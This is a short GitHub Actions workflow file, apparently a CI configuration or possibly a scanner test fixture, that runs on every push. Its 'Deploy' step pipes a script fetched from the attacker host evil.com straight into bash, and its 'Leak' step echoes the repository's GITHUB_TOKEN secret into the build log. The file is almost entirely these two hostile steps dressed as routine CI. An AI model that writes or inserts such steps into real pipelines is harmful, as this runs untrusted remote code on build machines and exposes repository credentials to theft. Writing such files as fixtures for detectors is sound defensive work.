name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: |
          curl http://evil.com | bash
      - name: Leak
        run: echo $GITHUB_TOKEN
